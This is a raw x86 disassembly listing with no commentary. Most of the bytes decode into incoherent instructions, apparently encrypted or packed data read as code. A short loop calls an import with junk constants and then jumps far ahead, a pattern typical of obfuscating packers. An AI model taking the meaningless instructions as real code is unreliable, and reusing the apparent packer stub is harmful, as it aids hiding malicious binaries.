  415a43:	orps   xmm4,XMMWORD PTR [eax+0x45]
  415a47:	push   ecx
  415a48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a49:	add    esi,DWORD PTR [edi]
  415a4b:	cmp    BYTE PTR [edi],0xb2
  415a4e:	adc    al,0xb8
  415a50:	outs   dx,DWORD PTR ds:[esi]
  415a51:	inc    ecx
  415a52:	loop   0x415a03
  415a54:	jnp    0x4159e2
  415a56:	popa   
  415a57:	xchg   ebx,eax
  415a58:	cld    
  415a59:	mov    eax,ds:0x791c87fc
  415a5e:	stc    
  415a5f:	sub    dl,bl
  415a61:	pusha  
  415a62:	xchg   ebx,eax
  415a63:	xor    dh,BYTE PTR [esi+0x1ba9681f]
  415a69:	jmp    0x7c64:0xe05bac92
  415a70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a71:	dec    edx
  415a72:	add    al,0x9b
  415a74:	add    BYTE PTR [esp+ebp*1+0x12],al
  415a78:	jg     0x415a8e
  415a7a:	test   bl,ch
  415a7c:	test   BYTE PTR ds:0x7aab59d1,al
  415a82:	jge    0x415af5
  415a84:	xchg   ebp,eax
  415a85:	push   0x31
  415a87:	and    DWORD PTR [eax+0x6d],ecx
  415a8a:	fistp  DWORD PTR [eax]
  415a8c:	xchg   edi,eax
  415a8d:	jnp    0x415ae4
  415a8f:	ss sub al,0xfb
  415a92:	loopne 0x415ab8
  415a94:	dec    ecx
  415a95:	mov    edi,0x887d97ff
  415a9a:	addr16 inc edx
  415a9c:	mov    dh,BYTE PTR [ecx-0x57]
  415a9f:	push   ds
  415aa0:	test   DWORD PTR [eax-0x1cdff9f6],ebx
  415aa6:	or     bl,BYTE PTR [esi+0x751cd06]
  415aac:	mov    ah,0xa3
  415aae:	iret   
  415aaf:	or     dh,BYTE PTR [esi+0x1bb38d0b]
  415ab5:	or     BYTE PTR [ecx-0xb4d7c15],bl
  415abb:	mov    edi,0x56ccaf62
  415ac0:	inc    edi
  415ac2:	fadd   st,st(4)
  415ac4:	or     dl,BYTE PTR [eax+0x8fcf528]
  415aca:	or     eax,0xa9c7c8cd
  415acf:	aas    
  415ad0:	mov    bl,0xc8
  415ad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ad3:	into   
  415ad4:	adc    al,dh
  415ad6:	daa    
  415ad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ad8:	mov    dh,BYTE PTR [edx+edx*8+0x15]
  415adc:	inc    ebx
  415ade:	mov    ah,0x92
  415ae0:	pop    edi
  415ae1:	aad    0x98
  415ae3:	mov    ecx,0xdea6e26e
  415ae8:	inc    esi
  415ae9:	adc    BYTE PTR [edx],dl
  415aeb:	stos   BYTE PTR es:[edi],al
  415aec:	cmp    al,0x6e
  415aee:	cmp    bh,BYTE PTR [ebx+0xdbb5e2a]
  415af4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415af5:	push   0x713b4177
  415afa:	jbe    0x415aa0
  415afc:	and    BYTE PTR [edx],dh
  415afe:	jg     0x415b24
  415b00:	pop    edi
  415b01:	xor    eax,0x818db9c7
  415b06:	push   0x7c
  415b08:	or     bh,0x8a
  415b0b:	lds    edi,FWORD PTR [edi+0x5]
  415b0e:	push   ebx
  415b0f:	pop    ss
  415b10:	inc    eax
  415b11:	add    eax,0x9b584d3d
  415b16:	bound  esp,QWORD PTR [esi]
  415b18:	call   0x7a52:0xe6a9d8d5
  415b1f:	add    al,0x8
  415b21:	adc    DWORD PTR [edi],eax
  415b23:	repz sub eax,0x83aa1fcd
  415b29:	dec    ebx
  415b2a:	jno    0x415acb
  415b2c:	add    eax,0x88b5f152
  415b31:	jge    0x415b04
  415b33:	jge    0x415ab9
  415b35:	cmp    edx,eax
  415b37:	mov    ds:0x330c558b,al
  415b3c:	(bad)  
  415b3d:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  415b44:	mov    eax,DWORD PTR [ebp+0xc]
  415b47:	xor    eax,esi
  415b49:	add    eax,edi
  415b4b:	pop    edi
  415b4c:	pop    esi
  415b4d:	pop    ebx
  415b4e:	leave  
  415b4f:	ret    0x8
  415b52:	push   ebp
  415b53:	mov    ebp,esp
  415b55:	push   ecx
  415b56:	and    DWORD PTR ds:0x42701c,0x0
  415b60:	jmp    0x415b70
  415b65:	mov    eax,ds:0x42701c
  415b6a:	inc    eax
  415b6b:	mov    ds:0x42701c,eax
  415b70:	cmp    DWORD PTR ds:0x42701c,0x1b
  415b77:	jae    0x415bbd
  415b7d:	cmp    DWORD PTR ds:0x42701c,0x25
  415b84:	jne    0x415bb8
  415b8a:	push   0x5668
  415b8f:	push   DWORD PTR [ebp-0x24]
  415b92:	push   DWORD PTR [ebp-0x10]
  415b95:	push   DWORD PTR [ebp-0x20]
  415b98:	push   0x7cb6
  415b9d:	push   DWORD PTR [ebp-0x24]
  415ba0:	push   0x559a
  415ba5:	push   0x4b12
  415baa:	push   0x6519
  415baf:	push   DWORD PTR [ebp-0x28]
  415bb2:	call   DWORD PTR ds:0x421030
  415bb8:	jmp    0x415b65
  415bbd:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  415bc4:	adc    DWORD PTR ds:0x428008,ecx
  415bca:	mov    eax,DWORD PTR [ebp+0x8]
  415bcd:	add    DWORD PTR ds:0x425010,0x223f
  415bd7:	jmp    0x417f24
  415bdc:	into   
  415bdd:	or     al,0x6c
  415bdf:	jg     0x415c4d
  415be1:	fild   QWORD PTR [ebp-0x75]
  415be4:	dec    ebx
  415be5:	mov    ebp,0xeb5618bc
  415bea:	stos   BYTE PTR es:[edi],al
  415beb:	jp     0x415bfa
  415bed:	inc    edi
  415bee:	popa   
  415bef:	bound  edx,QWORD PTR [edx+0x5f]
  415bf2:	bound  esp,QWORD PTR [edx-0x64]
  415bf5:	mov    fs,WORD PTR [edi+0x10]
  415bf8:	into   
  415bf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bfa:	push   ebx
  415bfb:	mov    esp,0x80a1fd2b
  415c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c01:	imul   ecx,DWORD PTR [esi-0x7c],0xebec3136
  415c08:	or     bh,dh
  415c0a:	dec    ebp
  415c0b:	retf   
  415c0c:	mov    ebx,0xbf8cc735
  415c11:	int3   
  415c12:	jg     0x415c3e
  415c14:	in     eax,dx
  415c15:	xchg   ebx,eax
  415c16:	mov    ebp,eax
  415c18:	mov    dl,0x47
  415c1a:	pop    es
  415c1b:	mov    bl,0xa6
  415c1d:	fisubr DWORD PTR [eax-0x1d]
  415c20:	or     DWORD PTR [esi+0x7988529a],edx
  415c26:	mov    dl,0x93
  415c28:	neg    ah
  415c2a:	stc    
  415c2b:	dec    eax
  415c2c:	idiv   DWORD PTR [ebp-0x32b91541]
  415c32:	and    ebp,DWORD PTR [eax+0x279c37db]
  415c38:	fs jne 0x415c85
  415c3b:	loop   0x415c64
  415c3d:	jmp    0x415c1a
  415c3f:	bound  edx,QWORD PTR [edi+0x51]
  415c42:	mov    esi,0x24da4168
  415c47:	mov    ecx,gs
  415c49:	adc    edi,DWORD PTR [edi+eax*4]
  415c4c:	sbb    DWORD PTR [esi],esi
  415c4e:	das    
  415c4f:	popa   
  415c50:	jmp    0x415c84
  415c52:	call   0x5f359409
  415c57:	xchg   ebx,eax
  415c58:	mov    bh,0xd7
  415c5a:	cmp    ch,BYTE PTR [edi+0x5]
  415c5d:	test   bh,ah
  415c5f:	ret    0x830a
  415c62:	stos   BYTE PTR es:[edi],al
  415c63:	push   ebx
  415c64:	shl    BYTE PTR [edx+0x32],1
  415c67:	fucomp st(6)
  415c69:	mov    dh,0x80
  415c6b:	int3   
  415c6c:	cwde   
  415c6d:	mul    BYTE PTR [ecx-0x33]
  415c70:	js     0x415c8b
  415c72:	scas   al,BYTE PTR es:[edi]
  415c73:	push   es
  415c74:	sub    BYTE PTR [ebx],bh
  415c76:	jmp    0x7e57:0x7de989df
  415c7d:	adc    al,BYTE PTR [eax]
  415c7f:	hlt    
  415c80:	and    BYTE PTR [eax-0x5c],dl
  415c83:	cmc    
  415c84:	fnstcw WORD PTR [esp+ecx*2-0x13]
  415c88:	scas   al,BYTE PTR es:[edi]
  415c89:	inc    ecx
  415c8a:	pop    esi
  415c8b:	push   cs
  415c8c:	sub    cl,BYTE PTR [eax-0x4848e22b]
  415c92:	das    
  415c93:	sub    ch,0x82
  415c96:	pop    es
  415c97:	mov    ecx,0x3abf10db
  415c9c:	aam    0xd
  415c9e:	jmp    0x12fb:0xf3b183d7
  415ca5:	popf   
  415ca6:	mov    bl,0xcd
  415ca8:	fld    DWORD PTR [eax-0xe76d979]
  415cae:	xor    BYTE PTR [eax+0x29],0x67
  415cb2:	fisttp QWORD PTR [eax-0x10]
  415cb5:	xchg   esp,esi
  415cb7:	add    cl,BYTE PTR ds:0xa749f105
  415cbd:	cmp    al,0x51
  415cbf:	jmp    0x415ca5
  415cc1:	(bad)  
  415cc2:	loope  0x415cc7
  415cc4:	inc    ecx
  415cc5:	and    ecx,DWORD PTR [edi-0x7a95ed53]
  415ccb:	jne    0x415c52
  415ccd:	mov    ch,0x40
  415ccf:	fistp  DWORD PTR [esi+0x2ada5d22]
  415cd5:	out    0x62,eax
  415cd7:	loope  0x415cf7
  415cd9:	aad    0x40
  415cdb:	mov    ah,0xb1
  415cdd:	outs   dx,DWORD PTR ds:[esi]
  415cde:	pop    edi
  415cdf:	ja     0x415cab
  415ce1:	bound  esp,QWORD PTR [edx-0x32]
  415ce4:	popf   
  415ce5:	(bad)  [eax]
  415ce7:	jl     0x415caf
  415ce9:	jmp    0x415d03
  415ceb:	cmp    cl,bh
  415ced:	fnstenv [eax-0x2484b133]
  415cf3:	jmp    0xd65ac10c
  415cf8:	cmp    al,0xe9
  415cfa:	sar    BYTE PTR [esi-0x2f],cl
  415cfd:	add    al,0x4d
  415cff:	addr16 jnp 0x415d4d
  415d02:	inc    edx
  415d03:	adc    eax,0x57906ec6
  415d08:	push   ss
  415d09:	inc    ebx
  415d0a:	out    dx,al
  415d0b:	ins    BYTE PTR es:[edi],dx
  415d0c:	cli    
  415d0d:	sbb    eax,0xf505372b
  415d12:	dec    eax
  415d13:	clc    
  415d14:	das    
  415d15:	popf   
  415d16:	hlt    
  415d17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d18:	mov    ds:0x4dcaad7,eax
  415d1d:	js     0x415d0d
  415d1f:	test   eax,0x78790d96
  415d24:	pop    edi
  415d25:	cmp    al,0xad
  415d27:	xchg   edi,eax
  415d28:	fnstenv [edx-0x462573fa]
  415d2e:	cmp    al,0xd5
  415d30:	(bad)  [ebx+0x76]
  415d33:	out    0x82,eax
  415d35:	xchg   esi,eax
  415d36:	jg     0x415db7
  415d38:	cwde   
  415d39:	and    al,0xe6
  415d3b:	or     dl,BYTE PTR [ebx]
  415d3d:	xchg   edi,eax
  415d3e:	in     eax,0xe8
  415d40:	bound  esi,QWORD PTR [edx]
  415d42:	inc    edi
  415d43:	cmp    BYTE PTR [eax+0x29],cl
  415d46:	pop    esp
  415d47:	icebp  
  415d48:	inc    esi
  415d49:	mov    al,ds:0xaced0973
  415d4e:	adc    al,0x4f
  415d50:	gs dec esi
  415d52:	clc    
  415d53:	sub    al,0x96
  415d55:	add    ah,BYTE PTR [ebx-0xa]
  415d58:	inc    esp
  415d59:	push   eax
  415d5a:	sbb    BYTE PTR ds:0x1c6be30e,0x43
  415d61:	(bad)  
  415d62:	adc    BYTE PTR [edi-0x1dd4bb01],dh
  415d68:	repz sub dh,BYTE PTR ds:0x12c86eb1
  415d6f:	sti    
  415d70:	(bad)  
  415d71:	push   ebx
  415d72:	cdq    
  415d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d74:	call   0xd0ef:0x6407d489
  415d7b:	mov    al,0xd7
  415d7d:	addr16 push ebp
  415d7f:	pop    esp
  415d80:	push   ecx
  415d81:	pop    esp
  415d82:	call   FWORD PTR [edx]
  415d84:	and    al,0x45
  415d86:	pop    esi
  415d87:	dec    edx
  415d88:	lods   eax,DWORD PTR ds:[esi]
  415d89:	dec    ebx
  415d8a:	outs   dx,BYTE PTR ds:[esi]
  415d8b:	loop   0x415d97
  415d8d:	pop    esp
  415d8e:	retf   0x4a84
  415d91:	pop    ebx
  415d92:	loop   0x415ddd
  415d94:	cwde   
  415d95:	and    ah,BYTE PTR [ebp+0x28]
  415d98:	sub    eax,0x11aa6578
  415d9d:	xchg   ebx,eax
  415d9e:	shl    DWORD PTR [eax-0x5ab54044],1
  415da4:	jp     0x415d8c
  415da6:	stos   DWORD PTR es:[edi],eax
  415da7:	int    0xdc
  415da9:	add    DWORD PTR [ecx+0x1b],eax
  415dac:	dec    esi
  415dad:	jg     0x415d53
  415daf:	loopne 0x415d86
  415db1:	push   0xee9557ea
  415db6:	jbe    0x415e19
  415db8:	add    edx,DWORD PTR [eax]
  415dba:	cs iret 
  415dbc:	sub    DWORD PTR [esi],esi
  415dbe:	cwde   
  415dbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dc0:	sbb    bh,BYTE PTR [eax+ecx*1]
  415dc3:	out    dx,al
  415dc4:	xor    eax,0x75b246
  415dc9:	xor    ebx,DWORD PTR [esi-0x37]
  415dcc:	mov    ds:0xf64d8f42,al
  415dd1:	fcom   DWORD PTR [ebx+0x1f55ac66]
  415dd7:	and    DWORD PTR [ebx],0xe7d77d93
  415ddd:	push   esp
  415dde:	jmp    0x415e42
  415de0:	jae    0x415e38
  415de2:	ret    
  415de3:	mov    dl,al
  415de5:	and    eax,0xa04cacef
  415dea:	ja     0x415db9
  415dec:	adc    DWORD PTR [eax-0x4c402c40],ebp
  415df2:	outs   dx,DWORD PTR ds:[esi]
  415df3:	test   al,0xc0
  415df5:	mov    ebp,0x73d83ee8
  415dfa:	std    
  415dfb:	je     0x415dc3
  415dfd:	pop    esi
  415dfe:	cmp    DWORD PTR [esi+0x47],esi
  415e01:	test   BYTE PTR [ecx+0x6c],ch
  415e04:	mov    eax,ds:0x52213ab
  415e09:	add    esi,DWORD PTR [ebx]
  415e0b:	xchg   ebp,eax
  415e0c:	bound  esp,QWORD PTR [ebx]
  415e0e:	jae    0x415e60
  415e10:	fdiv   DWORD PTR [edi]
  415e12:	push   edi
  415e13:	mov    ecx,0x22c07845
  415e18:	lds    ebx,FWORD PTR [edx-0xb76de3b]
  415e1e:	jg     0x415ddb
  415e20:	or     edi,DWORD PTR [ebx-0x63]
  415e23:	dec    esp
  415e24:	push   ebp
  415e25:	mov    ?,WORD PTR [esi]
  415e27:	xchg   dl,dh
  415e29:	gs aad 0xf1
  415e2c:	sbb    ah,BYTE PTR [eax+0x5e]
  415e2f:	add    ah,bl
  415e31:	mov    eax,ds:0xdc4d9d9
  415e36:	add    BYTE PTR [edi+ebx*2],cl
  415e39:	gs mov ah,0x4b
  415e3c:	test   eax,0xf5b87f7
  415e41:	pop    es
  415e42:	jo     0x415e94
  415e44:	sar    DWORD PTR [esi],0x8a
  415e47:	int3   
  415e48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e49:	adc    al,0x26
  415e4b:	dec    ebp
  415e4c:	inc    esi
  415e4d:	mov    eax,0xb9ee774
  415e52:	mov    BYTE PTR ds:0x9ce3bd7c,0x2e
  415e59:	jno    0x415e69
  415e5b:	retf   
  415e5c:	mov    ebp,0x8a367178
  415e61:	mov    esi,0x7e6231e6
  415e66:	cmp    bh,al
  415e68:	cdq    
  415e69:	push   cs
  415e6a:	dec    ebx
  415e6b:	in     eax,dx
  415e6c:	push   cs
  415e6d:	jge    0x415e13
  415e6f:	test   al,0xb1
  415e71:	or     edx,DWORD PTR [esi+ebx*8]
  415e74:	mov    ebp,0xd544995b
  415e79:	jo     0x415dfb
  415e7b:	jge    0x415edc
  415e7d:	mov    ebp,0x74f7fcb0
  415e82:	lods   al,BYTE PTR ds:[esi]
  415e83:	jb     0x415ea8
  415e85:	gs out dx,eax
  415e87:	xor    bh,BYTE PTR [eax+0x7c]
  415e8a:	test   al,0x8
  415e8c:	(bad)  
  415e8d:	cdq    
  415e8e:	add    bh,BYTE PTR [ebx]
  415e90:	mov    dh,0xe7
  415e92:	and    esi,DWORD PTR [esi-0x7b]
  415e95:	or     eax,0xdfc24ef0
  415e9a:	das    
  415e9b:	fimul  DWORD PTR [ecx-0x7cfb7c44]
  415ea1:	push   ebp
  415ea2:	ficomp WORD PTR [edx]
  415ea4:	imul   ebp,DWORD PTR [edi+0x61],0x8b97125e
  415eab:	call   0x2863:0xc586c0e4
  415eb2:	mov    BYTE PTR [ebx+edi*1+0x76],dl
  415eb6:	mov    ebx,0x97ff7b58
  415ebb:	lea    eax,[edi+0x223110c6]
  415ec1:	or     eax,0x73984685
  415ec6:	dec    edi
  415ec7:	dec    esp
  415ec8:	lods   eax,DWORD PTR ds:[esi]
  415ec9:	or     edx,DWORD PTR [edi+0x0]
  415ecc:	fdivr  QWORD PTR [ebp-0x12]
  415ecf:	popa   
  415ed0:	mov    eax,ds:0x626576a5
  415ed5:	adc    esi,DWORD PTR [edx]
  415ed7:	stos   BYTE PTR es:[edi],al
  415ed8:	ins    BYTE PTR es:[edi],dx
  415ed9:	push   0xffffffc4
  415edb:	aas    
  415edc:	mov    al,0x66
  415ede:	sbb    al,0xf6
  415ee0:	sub    edi,DWORD PTR [edx-0x37]
  415ee3:	aas    
  415ee4:	pusha  
  415ee5:	data16 cmp cl,ah
  415ee8:	and    dl,dh
  415eea:	mov    ebp,0xbb0660f4
  415eef:	sub    al,0xfe
  415ef1:	push   cs
  415ef2:	xor    BYTE PTR ds:0x45af10cf,dl
  415ef8:	(bad)  
  415ef9:	cld    
  415efa:	sar    BYTE PTR [ebx],1
  415efc:	and    eax,0xa6d9eae9
  415f01:	fwait
  415f02:	fs adc al,0xdd
  415f05:	cmp    esp,DWORD PTR [ecx+ebx*1-0x7d54adbb]
  415f0c:	push   eax
  415f0d:	sub    eax,0x65e6af1
  415f12:	inc    edx
  415f13:	add    DWORD PTR [edi+0x72389e09],0xfd832ef
  415f1d:	call   0x2668:0xcc1b71a8
  415f24:	test   dl,dl
  415f26:	xchg   edi,eax
  415f27:	jbe    0x415f34
  415f29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f2a:	test   eax,0x759cbddf
  415f2f:	pusha  
  415f30:	push   es
  415f31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f32:	jb     0x415ece
  415f34:	push   eax
  415f35:	cmp    dh,BYTE PTR [eax+ecx*4-0x7e3838a7]
  415f3c:	int3   
  415f3d:	pushf  
  415f3e:	data16 mov ?,WORD PTR [edx+0x67]
  415f42:	pop    esi
  415f43:	imul   ebx,DWORD PTR [eax],0xf8a90391
  415f49:	push   ds
  415f4a:	lods   al,BYTE PTR ds:[esi]
  415f4b:	jge    0x415ed6
  415f4d:	sti    
  415f4e:	xor    esi,DWORD PTR [esi+0x52]
  415f51:	outs   dx,DWORD PTR ds:[esi]
  415f52:	add    BYTE PTR [edi+0x6b93f682],bh
  415f58:	push   ebx
  415f59:	shr    BYTE PTR [ebx+0xa],0x1a
  415f5d:	jno    0x415ef2
  415f5f:	push   edx
  415f60:	cld    
  415f61:	mov    edx,eax
  415f63:	nop
  415f64:	lock add bl,0x5b
  415f68:	and    al,0x8
  415f6a:	iret   
  415f6b:	je     0x415fb7
  415f6d:	adc    BYTE PTR [ebx],bl
  415f6f:	daa    
  415f70:	arpl   WORD PTR [eax-0x2c],bx
  415f73:	imul   ebp,DWORD PTR [ebx],0xffffffd5
  415f76:	stos   DWORD PTR es:[edi],eax
  415f77:	ja     0x415fe7
  415f79:	aad    0x98
  415f7b:	std    
  415f7c:	xlat   BYTE PTR ds:[ebx]
  415f7d:	jecxz  0x415f7c
  415f7f:	mov    WORD PTR [ecx-0x78],ds
  415f82:	mov    ebx,eax
  415f84:	and    DWORD PTR [esi+ecx*4],ebx
  415f87:	cdq    
  415f88:	mov    DWORD PTR [ebx],ebx
  415f8a:	sub    eax,0xaf191dc5
  415f8f:	(bad)  
  415f90:	ror    BYTE PTR [edi+0x3f],0x71
  415f94:	jmp    0x76d9dd16
  415f99:	jge    0x415fb2
  415f9b:	mov    ch,BYTE PTR [ebx-0x4]
  415f9e:	pop    es
  415f9f:	cmp    ch,BYTE PTR [esi+ecx*2+0x34546636]
  415fa6:	jg     0x415fd2
  415fa8:	stc    
  415fa9:	xor    al,BYTE PTR [edx-0x26252e3]
  415faf:	jnp    0x415f5d
  415fb1:	and    DWORD PTR [esp+eiz*2+0x60],esi
  415fb5:	mov    al,ds:0x8959caf
  415fba:	test   DWORD PTR [edi+0x63],edi
  415fbd:	add    ah,BYTE PTR [edx+ecx*1+0x34]
  415fc1:	mov    ds:0x5d6c4645,eax
  415fc6:	and    ch,al
  415fc8:	adc    esi,esi
  415fca:	jecxz  0x415ffb
  415fcc:	pop    edx
  415fcd:	scas   eax,DWORD PTR es:[edi]
  415fce:	mov    bl,0x66
  415fd0:	xchg   ebx,eax
  415fd1:	and    dl,BYTE PTR [eax-0x5bd4f554]
  415fd7:	(bad)  
  415fd8:	je     0x416034
  415fda:	scas   al,BYTE PTR es:[edi]
  415fdb:	dec    eax
  415fdc:	stos   DWORD PTR es:[edi],eax
  415fdd:	pusha  
  415fde:	adc    DWORD PTR [ebx+0x64],ecx
  415fe1:	cli    
  415fe2:	cmc    
  415fe3:	xchg   esp,eax
  415fe4:	jo     0x415f6a
  415fe6:	je     0x415fea
  415fe8:	cwde   
  415fe9:	xchg   edx,eax
  415fea:	inc    ebx
  415feb:	aas    
  415fec:	push   ss
  415fed:	pushf  
  415fee:	cmp    esp,ebx
  415ff0:	aam    0x45
  415ff2:	inc    ecx
  415ff3:	jp     0x416069
  415ff5:	(bad)  
  415ff6:	out    dx,al
  415ff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ff8:	data16 mov WORD PTR [ebx+0x364febc5],cs
  415fff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416000:	out    0xf7,eax
  416002:	inc    esp
  416003:	inc    edi
  416004:	cmp    ebp,DWORD PTR [edx+0x60141958]
  41600a:	jecxz  0x416019
  41600c:	jge    0x415fee
  41600e:	jmp    0xa9ad:0x2bc035cc
  416015:	or     eax,DWORD PTR [esi+0x25]
  416018:	inc    ecx
  416019:	jno    0x415fa6
  41601b:	fistp  WORD PTR [ecx]
  41601d:	je     0x415fba
  41601f:	jmp    0x9fc7:0x91b33133
  416026:	dec    edi
  416027:	in     al,dx
  416028:	std    
  416029:	test   BYTE PTR [ebp+0x29],ch
  41602c:	push   esp
  41602d:	jbe    0x416068
  41602f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416030:	outs   dx,DWORD PTR ds:[esi]
  416031:	lods   eax,DWORD PTR ds:[esi]
  416032:	cld    
  416033:	addr16 jo 0x415fdd
  416036:	xlat   BYTE PTR ds:[ebx]
  416037:	jge    0x41609d
  416039:	push   edi
  41603a:	push   ss
  41603b:	popf   
  41603c:	xchg   ebx,eax
  41603d:	(bad)  
  41603e:	jnp    0x416072
  416040:	(bad)  
  416041:	imul   BYTE PTR [eax]
  416043:	adc    eax,DWORD PTR [ecx-0x6db31714]
  416049:	pop    esi
  41604a:	psubusb mm1,QWORD PTR ds:0x1f7878c3
  416051:	xchg   BYTE PTR [edi-0x26ab715e],bl
  416057:	(bad)  
  416058:	lahf   
  416059:	cmc    
  41605a:	arpl   WORD PTR [edi+0x4dee3ca9],dx
  416060:	(bad)  
  416061:	in     eax,0xc2
  416063:	stc    
  416064:	cwde   
  416065:	cmp    al,0x6e
  416067:	xchg   ebx,eax
  416068:	jnp    0x41606b
  41606a:	stos   DWORD PTR es:[edi],eax
  41606b:	fsubr  DWORD PTR [edi]
  41606d:	sub    ecx,DWORD PTR [edi+0x7617e6a7]
  416073:	in     al,0xae
  416075:	cmp    al,0xa6
  416077:	mov    ds:0x7c092d53,al
  41607c:	pop    ebx
  41607d:	shr    BYTE PTR [eax],0xf5
  416080:	push   esp
  416081:	loopne 0x416015
  416083:	xchg   ecx,eax
  416084:	or     cl,BYTE PTR [edi-0x6b778f3c]
  41608a:	sbb    al,0x1d
  41608c:	sub    BYTE PTR [edi+0x6a],0xea
  416090:	aam    0x5
  416092:	std    
  416093:	dec    edi
  416094:	daa    
  416095:	fcomp  DWORD PTR [ecx-0x49]
  416098:	or     eax,0xe97d803c
  41609d:	aad    0xd1
  41609f:	leave  
  4160a0:	mov    ebx,0x6eca0f36
  4160a5:	daa    
  4160a6:	jno    0x41603f
  4160a8:	int    0xa5
  4160aa:	enter  0x4619,0x6f
  4160ae:	lds    esi,FWORD PTR [eax+eax*1]
  4160b1:	das    
  4160b2:	xlat   BYTE PTR ds:[ebx]
  4160b3:	cld    
  4160b4:	jle    0x4160a3
  4160b6:	jge    0x416137
  4160b8:	push   ss
  4160b9:	cli    
  4160ba:	shl    DWORD PTR [edi],cl
  4160bc:	jp     0x41609d
  4160be:	out    0xdb,eax
  4160c0:	in     al,dx
  4160c1:	popa   
  4160c2:	and    BYTE PTR [ecx-0x23],cl
  4160c5:	lods   eax,DWORD PTR ds:[esi]
  4160c6:	inc    esp
  4160c7:	cmp    al,0x34
  4160c9:	popf   
  4160ca:	mov    ah,0x32
  4160cc:	sub    eax,0x9e8b81ff
  4160d1:	dec    ebp
  4160d2:	dec    esi
  4160d3:	push   0x37
  4160d5:	outs   dx,DWORD PTR ds:[esi]
  4160d6:	mov    ch,0x9
  4160d8:	fbstp  TBYTE PTR [edi]
  4160da:	sahf   
  4160db:	ins    BYTE PTR es:[edi],dx
  4160dc:	and    BYTE PTR [eax-0x5],bl
  4160df:	push   eax
  4160e0:	xor    ecx,DWORD PTR [edx]
  4160e2:	xchg   ecx,eax
  4160e3:	mov    ds:0x2bec257b,al
  4160e8:	int3   
  4160e9:	aad    0x54
  4160eb:	add    DWORD PTR [ebx],ebx
  4160ed:	sahf   
  4160ee:	repz mov edx,DWORD PTR [ebx]
  4160f1:	cdq    
  4160f2:	pushf  
  4160f3:	and    dl,ch
  4160f5:	popf   
  4160f6:	jne    0x4160a9
  4160f8:	or     al,0x51
  4160fa:	cdq    
  4160fb:	adc    eax,0x862d3e88
  416100:	hlt    
  416101:	xchg   DWORD PTR [eax+0x3a26bf64],edx
  416107:	inc    ebx
  416108:	pop    eax
  416109:	sub    al,0x11
  41610b:	rol    al,cl
  41610d:	(bad)  
  41610e:	and    eax,DWORD PTR [esi]
  416110:	push   ds
  416111:	xchg   DWORD PTR [ecx-0x54],edi
  416114:	mov    esi,DWORD PTR [eax+0x70]
  416117:	xchg   ebx,eax
  416118:	mov    edx,0x72ab4a8f
  41611d:	xor    DWORD PTR ds:0xd15f0f,edx
  416123:	sbb    DWORD PTR [esi],ebx
  416125:	call   0x46d6:0x89aee8f7
  41612c:	fiadd  WORD PTR [edx]
  41612e:	mov    cl,bl
  416130:	adc    eax,0x18a79e36
  416135:	mov    ecx,0x3e4f499a
  41613a:	ds scas eax,DWORD PTR es:[edi]
  41613c:	test   BYTE PTR [ebx-0x12021286],ch
  416142:	xlat   BYTE PTR ds:[ebx]
  416143:	test   DWORD PTR [eax-0x41],ebp
  416146:	add    DWORD PTR [esi+0x4b],esp
  416149:	mov    ds:0xd2ac5e65,al
  41614e:	cli    
  41614f:	or     eax,0xc82c2a5f
  416154:	gs xor ah,bh
  416157:	test   DWORD PTR [ebx+0x70437417],edx
  41615d:	dec    esi
  41615e:	pusha  
  41615f:	sbb    BYTE PTR [ebp-0x36],0x3c
  416163:	add    esi,edx
  416165:	sbb    al,0x68
  416167:	ret    0x54cc
  41616a:	sbb    ebx,eax
  41616c:	push   ss
  41616d:	(bad)  
  41616e:	mov    edx,0x4488c41e
  416173:	(bad)  
  416175:	pop    esp
  416176:	lods   eax,DWORD PTR ds:[esi]
  416177:	ins    DWORD PTR es:[edi],dx
  416178:	jg     0x41618b
  41617a:	fwait
  41617b:	and    DWORD PTR [ecx-0x3d],edi
  41617e:	loope  0x416193
  416180:	lea    ebx,[edi]
  416182:	add    eax,0x9ed34e6a
  416187:	cs adc eax,0xd337a285
  41618d:	addr16 dec ebx
  41618f:	mov    al,0xed
  416191:	jo     0x4161df
  416193:	fwait
  416194:	(bad)  
  416195:	ds out 0x7f,al
  416198:	clc    
  416199:	xlat   BYTE PTR ds:[ebx]
  41619a:	xchg   DWORD PTR [eax-0x8],esp
  41619d:	out    dx,eax
  41619e:	inc    ebp
  41619f:	shl    BYTE PTR [edi],1
  4161a1:	xchg   esi,eax
  4161a2:	push   esi
  4161a3:	push   cs
  4161a4:	fdivr  DWORD PTR [ebx-0x38ee18fc]
  4161aa:	ret    0x845c
  4161ad:	push   0xc3cd0cc9
  4161b2:	mov    cl,0x9a
  4161b4:	shl    BYTE PTR [ecx-0x1e],0x20
  4161b8:	mov    al,ds:0xa7da1321
  4161bd:	add    eax,0x6eada68
  4161c2:	daa    
  4161c3:	mov    esi,0xd767ea3a
  4161c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161c9:	jmp    0x416152
  4161cb:	add    BYTE PTR [ecx+0x2f],bh
  4161ce:	call   0x8757:0x8448eefc
  4161d5:	retf   
  4161d6:	cmp    al,0x9c
  4161d8:	jp     0x41620b
  4161da:	icebp  
  4161db:	sbb    eax,0x517af413
  4161e0:	add    DWORD PTR [ecx-0x24],0x46cab0f5
  4161e7:	hlt    
  4161e8:	mov    edi,0x2f33993b
  4161ed:	iret   
  4161ee:	jle    0x416269
  4161f0:	nop
  4161f1:	push   edi
  4161f2:	add    BYTE PTR [edi-0x34a2e8e1],0x65
